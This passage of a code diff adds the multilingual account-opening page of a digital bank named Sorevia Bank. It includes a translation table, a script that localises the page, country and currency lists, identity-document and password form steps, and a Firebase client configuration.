ülkenizi seçiniz."],"Sélectionnez votre pays.":["Select your country.","Seleccione su país.","Selezioni il suo paese.","Wählen Sie Ihr Land.","Selecione o seu país.","Wybierz swój kraj.","Выберите свою страну.","Selecteer uw land.","Ülkenizi seçiniz."],"Type de document *":["Document type *","Tipo de documento *","Tipo di documento *","Dokumentenart *","Tipo de documento *","Rodzaj dokumentu *","Тип документа *","Soort document *","Belge türü *"],"Téléphone *":["Phone *","Teléfono *","Telefono *","Telefon *","Telefone *","Telefon *","Телефон *","Telefoon *","Telefon *"],"Utilisez au minimum 6 caractères. Nous vous recommandons une combinaison de lettres, chiffres et symboles.":["Use at least 6 characters. We recommend a combination of letters, numbers and symbols.","Utilice al menos 6 caracteres. Recomendamos una combinación de letras, números y símbolos.","Usi almeno 6 caratteri. Consigliamo una combinazione di lettere, numeri e simboli.","Verwenden Sie mindestens 6 Zeichen. Wir empfehlen eine Kombination aus Buchstaben, Ziffern und Symbolen.","Utilize no mínimo 6 caracteres. Recomendamos uma combinação de letras, números e símbolos.","Użyj co najmniej 6 znaków. Zalecamy kombinację liter, cyfr i symboli.","Используйте не менее 6 символов. Рекомендуем сочетание букв, цифр и символов.","Gebruik minstens 6 tekens. Wij raden een combinatie van letters, cijfers en symbolen aan.","En az 6 karakter kullanın. Harf, rakam ve sembol karışımı öneriyoruz."],"Veuillez remplir tous les champs obligatoires.":["Please fill in all required fields.","Rellene todos los campos obligatorios.","Compili tutti i campi obbligatori.","Bitte füllen Sie alle Pflichtfelder aus.","Preencha todos os campos obrigatórios.","Wypełnij wszystkie wymagane pola.","Заполните все обязательные поля.","Vul alle verplichte velden in.","Lütfen tüm zorunlu alanları doldurunuz."],"Veuillez sélectionner une image.":["Please select an image.","Seleccione una imagen.","Selezioni un’immagine.","Bitte wählen Sie ein Bild aus.","Selecione uma imagem.","Wybierz obraz.","Выберите изображение.","Selecteer een afbeelding.","Lütfen bir görsel seçiniz."],"Veuillez sélectionner votre photo selfie avant de continuer.":["Please select your selfie photo before continuing.","Seleccione su foto selfie antes de continuar.","Selezioni il suo selfie prima di continuare.","Bitte wählen Sie Ihr Selfie-Foto aus, bevor Sie fortfahren.","Selecione a sua fotografia selfie antes de continuar.","Wybierz swoje zdjęcie selfie, zanim przejdziesz dalej.","Выберите своё селфи, прежде чем продолжить.","Selecteer uw selfie voordat u doorgaat.","Devam etmeden önce selfie fotoğrafınızı seçiniz."],"Ville *":["City *","Ciudad *","Città *","Stadt *","Cidade *","Miasto *","Город *","Stad *","Şehir *"],"Votre adresse":["Your address","Su dirección","Il suo indirizzo","Ihre Adresse","A sua morada","Twój adres","Ваш адрес","Uw adres","Adresiniz"],"Votre compte Sorevia Bank a été créé avec succès.":["Your Sorevia Bank account has been created successfully.","Su cuenta Sorevia Bank se ha creado con éxito.","Il suo conto Sorevia Bank è stato creato con successo.","Ihr Sorevia-Bank-Konto wurde erfolgreich erstellt.","A sua conta Sorevia Bank foi criada com sucesso.","Twoje konto Sorevia Bank zostało utworzone.","Ваш счёт Sorevia Bank успешно создан.","Uw Sorevia Bank-rekening is succesvol aangemaakt.","Sorevia Bank hesabınız başarıyla oluşturuldu."],"Votre mot de passe":["Your password","Su contraseña","La sua password","Ihr Passwort","A sua palavra-passe","Twoje hasło","Ваш пароль","Uw wachtwoord","Şifreniz"],"Votre nationalité":["Your nationality","Su nacionalidad","La sua nazionalità","Ihre Staatsangehörigkeit","A sua nacionalidade","Twoje obywatelstwo","Ваше гражданство","Uw nationaliteit","Uyruğunuz"],"Votre nom":["Your last name","Sus apellidos","Il suo cognome","Ihr Nachname","O seu apelido","Twoje nazwisko","Ваша фамилия","Uw achternaam","Soyadınız"],"Votre pièce d'identité est uniquement utilisé comme élément de vérification.":["Your identity document is used only as a means of verification.","Su documento de identidad se utiliza únicamente como elemento de verificación.","Il suo documento d’identità è utilizzato esclusivamente come elemento di verifica.","Ihr Ausweisdokument wird ausschließlich zur Überprüfung verwendet.","O seu documento de identificação é utilizado apenas como elemento de verificação.","Twój dokument tożsamości jest wykorzystywany wyłącznie w celu weryfikacji.","Ваш документ, удостоверяющий личность, используется только для проверки.","Uw identiteitsdocument wordt uitsluitend gebruikt ter verificatie.","Kimlik belgeniz yalnızca doğrulama amacıyla kullanılır."],"Votre profession":["Your occupation","Su profesión","La sua professione","Ihr Beruf","A sua profissão","Twój zawód","Ваша профессия","Uw beroep","Mesleğiniz"],"Votre prénom":["Your first name","Su nombre","Il suo nome","Ihr Vorname","O seu nome próprio","Twoje imię","Ваше имя","Uw voornaam","Adınız"],"Votre ville":["Your city","Su ciudad","La sua città","Ihre Stadt","A sua cidade","Twoje miasto","Ваш город","Uw stad","Şehriniz"],"Vous devez accepter les conditions générales.":["You must accept the terms and conditions.","Debe aceptar las condiciones generales.","Deve accettare le condizioni generali.","Sie müssen die Allgemeinen Bedingungen akzeptieren.","Tem de aceitar as condições gerais.","Musisz zaakceptować regulamin.","Необходимо принять общие условия.","U moet de algemene voorwaarden accepteren.","Genel koşulları kabul etmelisiniz."],"Vous devez certifier l'exactitude des informations.":["You must certify that the information is accurate.","Debe certificar la exactitud de la información.","Deve certificare l’esattezza delle informazioni.","Sie müssen die Richtigkeit der Angaben bestätigen.","Tem de certificar a exatidão das informações.","Musisz potwierdzić prawdziwość podanych informacji.","Необходимо подтвердить достоверность сведений.","U moet de juistheid van de gegevens bevestigen.","Bilgilerin doğruluğunu beyan etmelisiniz."],"Vous pouvez maintenant accéder à votre espace.":["You can now access your account area.","Ya puede acceder a su espacio.","Ora può accedere al suo spazio.","Sie können jetzt auf Ihren Bereich zugreifen.","Já pode aceder ao seu espaço.","Możesz teraz wejść do swojej strefy.","Теперь вы можете войти в свой кабинет.","U kunt nu toegang krijgen tot uw omgeving.","Artık alanınıza erişebilirsiniz."],"Vérification d'identité":["Identity verification","Verificación de identidad","Verifica dell’identità","Identitätsprüfung","Verificação de identidade","Weryfikacja tożsamości","Проверка личности","Identiteitsverificatie","Kimlik doğrulama"],"exemple@gmail.com":["example@gmail.com","ejemplo@gmail.com","esempio@gmail.com","beispiel@gmail.com","exemplo@gmail.com","przyklad@gmail.com","primer@gmail.com","voorbeeld@gmail.com","ornek@gmail.com"],"© 2026 — Plateforme bancaire numérique":["© 2026 — Digital banking platform","© 2026 — Plataforma bancaria digital","© 2026 — Piattaforma bancaria digitale","© 2026 — Digitale Bankplattform","© 2026 — Plataforma bancária digital","© 2026 — Cyfrowa platforma bankowa","© 2026 — Цифровая банковская платформа","© 2026 — Digitaal bankplatform","© 2026 — Dijital bankacılık platformu"],"ÉTAPE 1":["STEP 1","PASO 1","PASSAGGIO 1","SCHRITT 1","PASSO 1","KROK 1","ШАГ 1","STAP 1","ADIM 1"],"ÉTAPE 2":["STEP 2","PASO 2","PASSAGGIO 2","SCHRITT 2","PASSO 2","KROK 2","ШАГ 2","STAP 2","ADIM 2"],"ÉTAPE 3":["STEP 3","PASO 3","PASSAGGIO 3","SCHRITT 3","PASSO 3","KROK 3","ШАГ 3","STAP 3","ADIM 3"],"ÉTAPE 4":["STEP 4","PASO 4","PASSAGGIO 4","SCHRITT 4","PASSO 4","KROK 4","ШАГ 4","STAP 4","ADIM 4"],"ÉTAPE 5":["STEP 5","PASO 5","PASSAGGIO 5","SCHRITT 5","PASSO 5","KROK 5","ШАГ 5","STAP 5","ADIM 5"],"Étape {n} sur 5 —":["Step {n} of 5 —","Paso {n} de 5 —","Passaggio {n} di 5 —","Schritt {n} von 5 —","Passo {n} de 5 —","Krok {n} z 5 —","Шаг {n} из 5 —","Stap {n} van 5 —","Adım {n} / 5 —"],"← Retour":["← Back","← Volver","← Indietro","← Zurück","← Voltar","← Wstecz","← Назад","← Terug","← Geri"],"🔒Votre sécurité":["🔒 Your security","🔒 Su seguridad","🔒 La sua sicurezza","🔒 Ihre Sicherheit","🔒 A sua segurança","🔒 Twoje bezpieczeństwo","🔒 Ваша безопасность","🔒 Uw veiligheid","🔒 Güvenliğiniz"],"🔰Protection de vos informations":["🔰 Protection of your information","🔰 Protección de su información","🔰 Protezione delle sue informazioni","🔰 Schutz Ihrer Daten","🔰 Proteção das suas informações","🔰 Ochrona Twoich danych","🔰 Защита ваших данных","🔰 Bescherming van uw gegevens","🔰 Bilgilerinizin korunması"],"🔰Vérification de sécurité":["🔰 Security check","🔰 Verificación de seguridad","🔰 Verifica di sicurezza","🔰 Sicherheitsprüfung","🔰 Verificação de segurança","🔰 Weryfikacja bezpieczeństwa","🔰 Проверка безопасности","🔰 Beveiligingscontrole","🔰 Güvenlik doğrulaması"]};
+function pick(){
+  var q=null;try{q=new URLSearchParams(location.search).get("lang");}catch(e){}
+  if(q){q=String(q).toLowerCase().slice(0,2);if(SUP.indexOf(q)>-1)return{l:q,tag:DEF[q]};}
+  var list=(navigator.languages&&navigator.languages.length)?navigator.languages:[navigator.language||navigator.userLanguage||"en"];
+  for(var i=0;i<list.length;i++){var tag=String(list[i]||"");var p=tag.toLowerCase().slice(0,2);if(SUP.indexOf(p)>-1)return{l:p,tag:tag};}
+  return{l:"en",tag:"en-US"};
+}
+var P=pick(),L=P.l,idx=SUP.indexOf(L)-1,LOC=P.tag;
+try{new Intl.NumberFormat(LOC);}catch(e){LOC=DEF[L];}
+window.LANG=L;window.LOCALE=LOC;
+var AMT=/(\d{1,3}(?:[\s\u00a0\u202f]\d{3})*(?:,\d+)?)[\s\u00a0\u202f]*(€|\$)/g;
+function fmt(num,cur){
+  var v=parseFloat(num.replace(/[\s\u00a0\u202f]/g,"").replace(",","."));var dec=(num.split(",")[1]||"").length;
+  try{return new Intl.NumberFormat(LOC,{style:"currency",currency:cur==="€"?"EUR":"USD",minimumFractionDigits:dec,maximumFractionDigits:dec}).format(v);}
+  catch(e){return num+" "+cur;}
+}
+function tr(src){
+  var a=[];var key=src.replace(AMT,function(m,n,c){a.push([n,c]);return"§"+a.length;});
+  var m=/^(\d+) mois$/.exec(key);if(m&&D["mois"])return m[1]+" "+D["mois"][idx];
+  var t=D[key];
+  if(t===undefined){if(!a.length)return src;t=key;}else{t=t[idx];}
+  return t.replace(/§(\d)/g,function(x,i){var z=a[i-1];return z?fmt(z[0],z[1]):x;});
+}
+window.T=function(s){if(L==="fr")return s;return tr(String(s).replace(/\s+/g," ").trim());};
+if(L==="fr")return;
+document.documentElement.setAttribute("lang",L);
+function __run(){try{
+  var w=document.createTreeWalker(document.documentElement,NodeFilter.SHOW_TEXT,null),n,nodes=[];
+  while((n=w.nextNode()))nodes.push(n);
+  nodes.forEach(function(n){
+    var p=n.parentNode&&n.parentNode.nodeName;if(p==="SCRIPT"||p==="STYLE"||p==="NOSCRIPT")return;
+    var raw=n.nodeValue,src=raw.replace(/\s+/g," ").trim();if(!src)return;
+    var out=tr(src);if(out!==src)n.nodeValue=raw.match(/^\s*/)[0]+out+raw.match(/\s*$/)[0];
+  });
+  ["placeholder","aria-label","title","alt"].forEach(function(at){
+    document.querySelectorAll("["+at+"]").forEach(function(e){var v=e.getAttribute(at).replace(/\s+/g," ").trim();var o=tr(v);if(o!==v)e.setAttribute(at,o);});
+  });
+  var md=document.querySelector('meta[name="description"]');
+  if(md){var v=md.getAttribute("content").replace(/\s+/g," ").trim();var o=tr(v);if(o!==v)md.setAttribute("content",o);}
+}catch(e){if(window.console)console.error("i18n",e);}}
+if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",__run);else __run();
+})();
+
+var _dnR,_dnC;
+function cLabel(c){
+  if(LANG==="fr")return c[0];
+  try{_dnR=_dnR||new Intl.DisplayNames([LOCALE],{type:"region"});var r=_dnR.of(c[2]);if(r&&r!==c[2])return r;}catch(e){}
+  return c[0];
+}
+function curLabel(code,fr){
+  if(LANG==="fr")return fr;
+  try{_dnC=_dnC||new Intl.DisplayNames([LOCALE],{type:"currency"});var r=_dnC.of(code);if(r&&r!==code)return r.charAt(0).toLocaleUpperCase(LOCALE)+r.slice(1);}catch(e){}
+  return fr;
+}
+function monthNames(){
+  var f=["Janvier","Février","Mars","Avril","Mai","Juin","Juillet","Août","Septembre","Octobre","Novembre","Décembre"];
+  if(LANG==="fr")return f;
+  try{var fm=new Intl.DateTimeFormat(LOCALE,{month:"long"});var a=[];
+    for(var i=0;i<12;i++){var s=fm.format(new Date(2000,i,15));a.push(s.charAt(0).toLocaleUpperCase(LOCALE)+s.slice(1));}
+    return a;}catch(e){return f;}
+}
+
+</script>
+<script>
+
+const COUNTRIES=[
+["Afghanistan","Asie","AF","AFN"],["Albanie","Europe","AL","ALL"],["Algérie","Afrique","DZ","DZD"],["Andorre","Europe","AD","EUR"],["Angola","Afrique","AO","AOA"],["Antigua-et-Barbuda","Amérique","AG","XCD"],["Argentine","Amérique","AR","ARS"],["Arménie","Asie","AM","AMD"],["Australie","Océanie","AU","AUD"],["Autriche","Europe","AT","EUR"],["Azerbaïdjan","Asie","AZ","AZN"],["Bahamas","Amérique","BS","BSD"],["Bahreïn","Asie","BH","BHD"],["Bangladesh","Asie","BD","BDT"],["Barbade","Amérique","BB","BBD"],["Biélorussie","Europe","BY","BYN"],["Belgique","Europe","BE","EUR"],["Belize","Amérique","BZ","BZD"],["Bénin","Afrique","BJ","XOF"],["Bhoutan","Asie","BT","BTN"],["Bolivie","Amérique","BO","BOB"],["Bosnie-Herzégovine","Europe","BA","BAM"],["Botswana","Afrique","BW","BWP"],["Brésil","Amérique","BR","BRL"],["Brunei","Asie","BN","BND"],["Bulgarie","Europe","BG","BGN"],["Burkina Faso","Afrique","BF","XOF"],["Burundi","Afrique","BI","BIF"],["Cabo Verde","Afrique","CV","CVE"],["Cambodge","Asie","KH","KHR"],["Cameroun","Afrique","CM","XAF"],["Canada","Amérique","CA","CAD"],["République centrafricaine","Afrique","CF","XAF"],["Tchad","Afrique","TD","XAF"],["Chili","Amérique","CL","CLP"],["Chine","Asie","CN","CNY"],["Colombie","Amérique","CO","COP"],["Comores","Afrique","KM","KMF"],["République du Congo","Afrique","CG","XAF"],["République démocratique du Congo","Afrique","CD","CDF"],["Costa Rica","Amérique","CR","CRC"],["Côte d’Ivoire","Afrique","CI","XOF"],["Croatie","Europe","HR","EUR"],["Cuba","Amérique","CU","CUP"],["Chypre","Europe","CY","EUR"],["Tchéquie","Europe","CZ","CZK"],["Danemark","Europe","DK","DKK"],["Djibouti","Afrique","DJ","DJF"],["Dominique","Amérique","DM","XCD"],["République dominicaine","Amérique","DO","DOP"],["Équateur","Amérique","EC","USD"],["Égypte","Afrique","EG","EGP"],["El Salvador","Amérique","SV","USD"],["Guinée équatoriale","Afrique","GQ","XAF"],["Érythrée","Afrique","ER","ERN"],["Estonie","Europe","EE","EUR"],["Eswatini","Afrique","SZ","SZL"],["Éthiopie","Afrique","ET","ETB"],["Fidji","Océanie","FJ","FJD"],["Finlande","Europe","FI","EUR"],["France","Europe","FR","EUR"],["Gabon","Afrique","GA","XAF"],["Gambie","Afrique","GM","GMD"],["Géorgie","Asie","GE","GEL"],["Allemagne","Europe","DE","EUR"],["Ghana","Afrique","GH","GHS"],["Grèce","Europe","GR","EUR"],["Grenade","Amérique","GD","XCD"],["Guatemala","Amérique","GT","GTQ"],["Guinée","Afrique","GN","GNF"],["Guinée-Bissau","Afrique","GW","XOF"],["Guyana","Amérique","GY","GYD"],["Haïti","Amérique","HT","HTG"],["Honduras","Amérique","HN","HNL"],["Hongrie","Europe","HU","HUF"],["Islande","Europe","IS","ISK"],["Inde","Asie","IN","INR"],["Indonésie","Asie","ID","IDR"],["Iran","Asie","IR","IRR"],["Irak","Asie","IQ","IQD"],["Irlande","Europe","IE","EUR"],["Israël","Asie","IL","ILS"],["Italie","Europe","IT","EUR"],["Jamaïque","Amérique","JM","JMD"],["Japon","Asie","JP","JPY"],["Jordanie","Asie","JO","JOD"],["Kazakhstan","Asie","KZ","KZT"],["Kenya","Afrique","KE","KES"],["Kiribati","Océanie","KI","AUD"],["Koweït","Asie","KW","KWD"],["Kirghizistan","Asie","KG","KGS"],["Laos","Asie","LA","LAK"],["Lettonie","Europe","LV","EUR"],["Liban","Asie","LB","LBP"],["Lesotho","Afrique","LS","LSL"],["Libéria","Afrique","LR","LRD"],["Libye","Afrique","LY","LYD"],["Liechtenstein","Europe","LI","CHF"],["Lituanie","Europe","LT","EUR"],["Luxembourg","Europe","LU","EUR"],["Madagascar","Afrique","MG","MGA"],["Malawi","Afrique","MW","MWK"],["Malaisie","Asie","MY","MYR"],["Maldives","Asie","MV","MVR"],["Mali","Afrique","ML","XOF"],["Malte","Europe","MT","EUR"],["Îles Marshall","Océanie","MH","USD"],["Mauritanie","Afrique","MR","MRU"],["Maurice","Afrique","MU","MUR"],["Mexique","Amérique","MX","MXN"],["Micronésie","Océanie","FM","USD"],["Moldavie","Europe","MD","MDL"],["Monaco","Europe","MC","EUR"],["Mongolie","Asie","MN","MNT"],["Monténégro","Europe","ME","EUR"],["Maroc","Afrique","MA","MAD"],["Mozambique","Afrique","MZ","MZN"],["Myanmar","Asie","MM","MMK"],["Namibie","Afrique","NA","NAD"],["Nauru","Océanie","NR","AUD"],["Népal","Asie","NP","NPR"],["Pays-Bas","Europe","NL","EUR"],["Nouvelle-Zélande","Océanie","NZ","NZD"],["Nicaragua","Amérique","NI","NIO"],["Niger","Afrique","NE","XOF"],["Nigeria","Afrique","NG","NGN"],["Corée du Nord","Asie","KP","KPW"],["Macédoine du Nord","Europe","MK","MKD"],["Norvège","Europe","NO","NOK"],["Oman","Asie","OM","OMR"],["Pakistan","Asie","PK","PKR"],["Palaos","Océanie","PW","USD"],["Panama","Amérique","PA","PAB"],["Papouasie-Nouvelle-Guinée","Océanie","PG","PGK"],["Paraguay","Amérique","PY","PYG"],["Pérou","Amérique","PE","PEN"],["Philippines","Asie","PH","PHP"],["Pologne","Europe","PL","PLN"],["Portugal","Europe","PT","EUR"],["Qatar","Asie","QA","QAR"],["Roumanie","Europe","RO","RON"],["Russie","Europe","RU","RUB"],["Rwanda","Afrique","RW","RWF"],["Saint-Christophe-et-Niévès","Amérique","KN","XCD"],["Sainte-Lucie","Amérique","LC","XCD"],["Saint-Vincent-et-les-Grenadines","Amérique","VC","XCD"],["Samoa","Océanie","WS","WST"],["Saint-Marin","Europe","SM","EUR"],["São Tomé-et-Príncipe","Afrique","ST","STN"],["Arabie saoudite","Asie","SA","SAR"],["Sénégal","Afrique","SN","XOF"],["Serbie","Europe","RS","RSD"],["Seychelles","Afrique","SC","SCR"],["Sierra Leone","Afrique","SL","SLE"],["Singapour","Asie","SG","SGD"],["Slovaquie","Europe","SK","EUR"],["Slovénie","Europe","SI","EUR"],["Îles Salomon","Océanie","SB","SBD"],["Somalie","Afrique","SO","SOS"],["Afrique du Sud","Afrique","ZA","ZAR"],["Corée du Sud","Asie","KR","KRW"],["Soudan du Sud","Afrique","SS","SSP"],["Espagne","Europe","ES","EUR"],["Sri Lanka","Asie","LK","LKR"],["Soudan","Afrique","SD","SDG"],["Suriname","Amérique","SR","SRD"],["Suède","Europe","SE","SEK"],["Suisse","Europe","CH","CHF"],["Syrie","Asie","SY","SYP"],["Taïwan","Asie","TW","TWD"],["Tadjikistan","Asie","TJ","TJS"],["Tanzanie","Afrique","TZ","TZS"],["Thaïlande","Asie","TH","THB"],["Timor oriental","Asie","TL","USD"],["Togo","Afrique","TG","XOF"],["Tonga","Océanie","TO","TOP"],["Trinité-et-Tobago","Amérique","TT","TTD"],["Tunisie","Afrique","TN","TND"],["Turquie","Asie","TR","TRY"],["Turkménistan","Asie","TM","TMT"],["Tuvalu","Océanie","TV","AUD"],["Ouganda","Afrique","UG","UGX"],["Ukraine","Europe","UA","UAH"],["Émirats arabes unis","Asie","AE","AED"],["Royaume-Uni","Europe","GB","GBP"],["États-Unis","Amérique","US","USD"],["Uruguay","Amérique","UY","UYU"],["Ouzbékistan","Asie","UZ","UZS"],["Vanuatu","Océanie","VU","VUV"],["Vatican","Europe","VA","EUR"],["Venezuela","Amérique","VE","VES"],["Vietnam","Asie","VN","VND"],["Yémen","Asie","YE","YER"],["Zambie","Afrique","ZM","ZMW"],["Zimbabwe","Afrique","ZW","ZWG"]
+];
+
+const currencyNames={
+XOF:"Franc CFA BCEAO",XAF:"Franc CFA BEAC",EUR:"Euro",USD:"Dollar américain",GBP:"Livre sterling",CAD:"Dollar canadien",AUD:"Dollar australien",CHF:"Franc suisse",NGN:"Naira nigérian",GHS:"Cedi ghanéen",MAD:"Dirham marocain",DZD:"Dinar algérien",TND:"Dinar tunisien",KES:"Shilling kényan",ZAR:"Rand sud-africain",EGP:"Livre égyptienne",INR:"Roupie indienne",CNY:"Yuan chinois",JPY:"Yen japonais",KRW:"Won sud-coréen",AED:"Dirham des Émirats arabes unis",SAR:"Riyal saoudien",BRL:"Réal brésilien",MXN:"Peso mexicain",ARS:"Peso argentin",CLP:"Peso chilien",COP:"Peso colombien",PEN:"Sol péruvien",XCD:"Dollar des Caraïbes orientales",XPF:"Franc CFP",NZD:"Dollar néo-zélandais",SGD:"Dollar de Singapour",HKD:"Dollar de Hong Kong",TRY:"Livre turque",RUB:"Rouble russe",UAH:"Hryvnia ukrainienne",PLN:"Zloty polonais",SEK:"Couronne suédoise",NOK:"Couronne norvégienne",DKK:"Couronne danoise",ISK:"Couronne islandaise",CZK:"Couronne tchèque",HUF:"Forint hongrois",RON:"Leu roumain",BGN:"Lev bulgare",RSD:"Dinar serbe",BAM:"Mark convertible",MKD:"Denar macédonien",GEL:"Lari géorgien",KZT:"Tenge kazakh",THB:"Baht thaïlandais",MYR:"Ringgit malaisien",IDR:"Roupie indonésienne",PHP:"Peso philippin",VND:"Dong vietnamien",PKR:"Roupie pakistanaise",BDT:"Taka bangladais",NPR:"Roupie népalaise",LKR:"Roupie sri-lankaise",ETB:"Birr éthiopien",TZS:"Shilling tanzanien",UGX:"Shilling ougandais",RWF:"Franc rwandais",BWP:"Pula botswanais",ZMW:"Kwacha zambien",MZN:"Metical mozambicain",MUR:"Roupie mauricienne",SCR:"Roupie seychelloise",CDF:"Franc congolais",GNF:"Franc guinéen",GMD:"Dalasi gambien",SLE:"Leone sierra-léonais",LRD:"Dollar libérien",SLL:"Leone",HTG:"Gourde haïtienne",DOP:"Peso dominicain",GTQ:"Quetzal guatémaltèque",HNL:"Lempira hondurien",NIO:"Córdoba nicaraguayen",CRC:"Colón costaricien",PAB:"Balboa panaméen",PYG:"Guarani paraguayen",BOB:"Boliviano",UYU:"Peso uruguayen",JMD:"Dollar jamaïcain",TTD:"Dollar de Trinité-et-Tobago",BSD:"Dollar bahaméen",BBD:"Dollar barbadien",GYD:"Dollar guyanien",SRD:"Dollar surinamais",FJD:"Dollar fidjien",PGK:"Kina papouan",SBD:"Dollar des Salomon",TOP:"Pa'anga tongien",WST:"Tala samoan",VUV:"Vatu vanuatais",KWD:"Dinar koweïtien",BHD:"Dinar bahreïni",OMR:"Rial omanais",QAR:"Rial qatari",JOD:"Dinar jordanien",ILS:"Nouveau shekel israélien",IRR:"Rial iranien",IQD:"Dinar irakien",LBP:"Livre libanaise",YER:"Rial yéménite",AFN:"Afghani",ALL:"Lek albanais",AMD:"Dram arménien",AZN:"Manat azerbaïdjanais",BYN:"Rouble biélorusse",MDL:"Leu moldave",MNT:"Tugrik mongol",TJS:"Somoni tadjik",TMT:"Manat turkmène",UZS:"Sum ouzbek",KGS:"Som kirghize",LAK:"Kip laotien",KHR:"Riel cambodgien",MMK:"Kyat birman",BTN:"Ngultrum bhoutanais",MVR:"Rufiyaa maldivienne",BND:"Dollar de Brunei",NAD:"Dollar namibien",SZL:"Lilangeni",LSL:"Loti",MWK:"Kwacha malawite",BIF:"Franc burundais",DJF:"Franc djiboutien",KMF:"Franc comorien",ERN:"Nakfa érythréen",SSP:"Livre sud-soudanaise",SDG:"Livre soudanaise",LYD:"Dinar libyen",MRU:"Ouguiya mauritanien",CVE:"Escudo cap-verdien",AOA:"Kwanza angolais",MGA:"Ariary malgache",STN:"Dobra santoméen",CUP:"Peso cubain",BZD:"Dollar bélizien",GIP:"Livre de Gibraltar",ISK:"Couronne islandaise",BAM:"Mark convertible"
+};
+
+const countrySelect=document.getElementById("pays");
+COUNTRIES.sort((a,b)=>cLabel(a).localeCompare(cLabel(b),LOCALE)).forEach(c=>{
+const o=document.createElement("option");
+o.value=c[0];
+o.textContent=cLabel(c);
+o.dataset.continent=c[1];
+o.dataset.iso=c[2];
+o.dataset.currency=c[3];
+countrySelect.appendChild(o);
+});
+
+document.getElementById("continent").addEventListener("change",function(){
+const continent=this.value;
+[...countrySelect.options].forEach(o=>{
+if(!o.value)return;
+o.hidden=continent&&o.dataset.continent!==continent;
+});
+countrySelect.value="";
+document.getElementById("devise").innerHTML='<option value="">'+T("Choisir une devise")+'</option>';
+});
+
+countrySelect.addEventListener("change",function(){
+const o=this.options[this.selectedIndex];
+const code=o.dataset.currency||"";
+const name=curLabel(code,currencyNames[code]||code);
+document.getElementById("countryFlag").textContent="🌍";
+document.getElementById("countryName").textContent=o.value?o.textContent:T("Pays non sélectionné");
+document.getElementById("countryCurrency").textContent=o.value?name+" ("+code+")":T("Sélectionnez votre pays.");
+const d=document.getElementById("devise");
+d.innerHTML="";
+const opt=document.createElement("option");
+opt.value=code;
+opt.textContent=name+" ("+code+")";
+d.appendChild(opt);
+});
+</script>
+
+<section class="panel" id="step4">
+
+<div class="sectionHead">
+<span class="eyebrow">ÉTAPE 4</span>
+<h2>Vérification d'identité</h2>
+<p>Ajoutez les informations de votre pièce d'identité.</p>
+</div>
+
+<div class="grid">
+
+<div class="field" id="documentTypeBox">
+<label for="documentType">Type de document *</label>
+<select class="select" id="documentType">
+<option value="">Choisir</option>
+<option value="Carte nationale d'identité">Carte nationale d'identité</option>
+<option value="Passeport">Passeport</option>
+<option value="Carte de séjour">Carte de séjour</option>
+<option value="Permis de conduire">Permis de conduire</option>
+</select>
+</div>
+
+<div class="field" id="documentNumberBox">
+<label for="documentNumber">Numéro du document *</label>
+<input class="input" id="documentNumber" type="text" placeholder="Numéro du document">
+</div>
+
+<div class="field full" id="expirationBox">
+<label>Date d'expiration *</label>
+<div class="dateParts" data-date-group="expiration">
+<select class="select" id="expirationJour" aria-label="Jour d'expiration"><option value="">Jour</option></select>
+<select class="select" id="expirationMois" aria-label="Mois d'expiration"><option value="">Mois</option></select>
+<select class="select" id="expirationAn" aria-label="Année d'expiration"><option value="">Année</option></select>
+</div>
+<input id="expiration" type="hidden">
+</div>
+
+</div>
+
+<div class="notice">
+<strong>🔰Vérification de sécurité</strong><br>
+Votre pièce d'identité est uniquement utilisé comme élément de vérification.
+</div>
+
+<div class="camera">
+<label for="photo">Prendre une photo de votre pièce d'identité</label>
+<input type="file" id="photo" accept="image/*">
+</div>
+
+<div class="navButtons">
+<button class="secondary btn" id="back4" type="button">← Retour</button>
+<button class="primary btn" id="continue4" type="button">Continuer →</button>
+</div>
+
+</section>
+
+<section class="panel" id="step5">
+
+<div class="sectionHead">
+<span class="eyebrow">ÉTAPE 5</span>
+<h2>Sécurisez votre compte</h2>
+<p>Créez le mot de passe qui sera utilisé pour accéder à votre espace.</p>
+</div>
+
+<div class="notice">
+<strong>🔒Votre sécurité</strong><br>
+Utilisez au minimum 6 caractères. Nous vous recommandons une combinaison de lettres, chiffres et symboles.
+</div>
+
+<div class="field passwordBox" id="passwordBox">
+<label for="password">Mot de passe *</label>
+<input class="input" id="password" type="password" autocomplete="new-password" placeholder="Votre mot de passe">
+<button class="togglePass" type="button" id="togglePassword">Afficher</button>
+</div>
+
+<div class="field passwordBox" id="confirmBox">
+<label for="confirmPassword">Confirmer le mot de passe *</label>
+<input class="input" id="confirmPassword" type="password" autocomplete="new-password" placeholder="Confirmez votre mot de passe">
+<button class="togglePass" type="button" id="toggleConfirm">Afficher</button>
+</div>
+
+<label class="check" id="acceptBox">
+<input type="checkbox" id="accept">
+<span>J'accepte les conditions générales d'utilisation de Sorevia Bank.</span>
+</label>
+
+<label class="check" id="certifyBox">
+<input type="checkbox" id="certify">
+<span>Je certifie que les informations fournies sont exactes.</span>
+</label>
+
+<div class="navButtons">
+<button class="secondary btn" id="back5" type="button">← Retour</button>
+<button class="primary btn" id="createAccount" type="button">Créer mon compte ✓</button>
+</div>
+
+</section>
+
+<div class="success" id="successBox">
+
+<div class="successIcon">✓</div>
+
+<h2>Compte créé avec succès</h2>
+
+<p>
+Votre compte Sorevia Bank a été créé avec succès.
+<br>
+Vous pouvez maintenant accéder à votre espace.
+</p>
+
+</div>
+
+</div>
+
+</main>
+
+<footer class="footer">
+<strong>Sorevia Bank</strong>
+© 2026 — Plateforme bancaire numérique
+</footer>
+
+</div>
+
+
+<script type="module">
+
+import{initializeApp}from"https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import{getAuth,createUserWithEmailAndPassword}from"https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";
+import{getFirestore,doc,setDoc,serverTimestamp}from"https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+const firebaseConfig={
+apiKey:"AIzaSyA_iq7zGnD4100DM06D9sXgMjbCwfqq3JU",
+authDomain:"sorevia-bank.firebaseapp.com",
+projectId:"sorevia-bank",
+storageBucket:"sorevia-bank.firebasestorage.app",
+messagingSenderId:"729316261396",
+appId:"1:729316261396:web:bfeebed60e968c65433101",
+measurementId:"G-HF074LQR8Y"
+};
+
+const appFirebase=initializeApp(firebaseConfig);
+const auth=getAuth(appFirebase);
+const db=getFirestore(appFirebase);
+
+const $=id=>document.getElementById(id);
+
+/* SELECTEURS DE DATE : Jour / Mois / Année */
+const MONTHS=monthNames();
+function setupDateGroup(prefix, firstYear, lastYear){
+  const day=$(prefix+"Jour"), month=$(prefix+"Mois"), year=$(prefix+"An"), hidden=$(prefix);
